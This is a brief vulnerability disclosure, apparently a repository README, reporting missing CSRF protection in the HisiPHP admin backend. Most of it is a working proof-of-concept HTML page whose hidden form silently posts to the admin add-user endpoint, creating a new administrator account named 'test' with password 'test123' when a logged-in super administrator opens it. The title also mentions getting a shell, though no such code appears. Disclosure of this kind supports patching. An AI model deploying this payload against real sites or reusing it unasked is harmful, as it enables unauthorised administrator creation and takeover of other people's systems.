# vuln
csrf and Background getshell!





The background operation has no scrf protection, and can use this vulnerability to perform various sensitive operations such as adding, deleting, and checking the management background. For example: add a system administrator

POC:
<html>
  <body>
  <script>history.pushState('', '', '/')</script>
    <form action="http://localhost/hisiphp-master/hisiphp-master/admin.php/admin/user/adduser.html" method="POST">
      <input type="hidden" name="role&#95;id" value="2" />
      <input type="hidden" name="username" value="test" />
      <input type="hidden" name="nick" value="test" />
      <input type="hidden" name="password" value="test123" />
      <input type="hidden" name="password&#95;confirm" value="test123" />
      <input type="hidden" name="email" value="test&#64;test&#46;com" />
      <input type="hidden" name="mobile" value="18888888888" />
      <input type="hidden" name="status" value="1" />
      <input type="hidden" name="id" value="" />
      <input type="submit" value="Submit request" />
    </form>
  </body>
</html>

The super administrator will add a 'test' account after accessing the link generated by the above poc test. The password is 'test123'.
